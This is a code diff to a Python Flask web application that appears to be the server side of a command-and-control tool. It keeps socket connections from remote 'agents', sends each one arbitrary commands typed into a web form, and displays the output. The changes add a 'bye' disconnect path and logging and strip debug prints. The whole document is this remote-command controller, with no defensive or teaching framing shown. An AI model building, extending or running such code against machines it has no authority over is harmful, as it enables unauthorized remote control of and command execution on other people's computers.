@@ -51,13 +51,16 @@ def handle_connection(connection,thread_index):
         while CMD_INPUT[thread_index]!='':
             print('inside of while')    
             usr_msg = CMD_INPUT[thread_index]
+            print(f'about to send {usr_msg}')
             connection.send(usr_msg.encode())
-            CMD_INPUT[thread_index]=''
-            usr_msg=connection.recv(1024).decode()
-            CMD_OUTPUT[thread_index]=usr_msg
+            if CMD_INPUT[thread_index] !='bye':
+                CMD_INPUT[thread_index]=''
+                usr_msg=connection.recv(1024).decode()
+                CMD_OUTPUT[thread_index]=usr_msg
+                print("Leaving second while!!!!")
             break
-            
-    connection.close()
+    app.logger.info(f'disconnecting {COMPUTERS[thread_index]}!!!!!!!!!!!!!!!!!!')
+    disconnect(connection,thread_index)
 
 def disconnect(connection,thread_index):
     connection.close()
@@ -66,6 +69,7 @@ def disconnect(connection,thread_index):
     IPS.pop(thread_index)
     CMD_OUTPUT.pop(thread_index)
     COMPUTERS.pop(thread_index)
+
 
 def find_connection(connection):
     for i,conn in enumerate(CONNECTIONS):
@@ -89,7 +93,6 @@ def executecmd(agentname):
 @app.route("/<agentname>/executecmd",methods=['GET','POST'])
 def execute(agentname):
     if request.method == 'POST':
-        print('got into POST')
         cmd = request.form['command']
         for i in COMPUTERS:
             if agentname == i:
@@ -97,12 +100,12 @@ def execute(agentname):
                 print(req_index)
                 break
         CMD_INPUT[req_index] = cmd
-        print(f'req_index ----> {req_index}')
         time.sleep(2)
-        cmdoutput = CMD_OUTPUT[req_index]
-        print(f'CMD OUTPUT --> {CMD_OUTPUT}')
-        print(f'CMD_INPUT --> {CMD_INPUT}')
-        return render_template('executecmd.html',cmdoutput=cmdoutput,name=COMPUTERS[req_index])
+        if cmd == 'bye':
+            return redirect("/agents")
+        else:
+            cmdoutput = CMD_OUTPUT[req_index]
+            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=COMPUTERS[req_index])
 
 
 if __name__=='__main__':
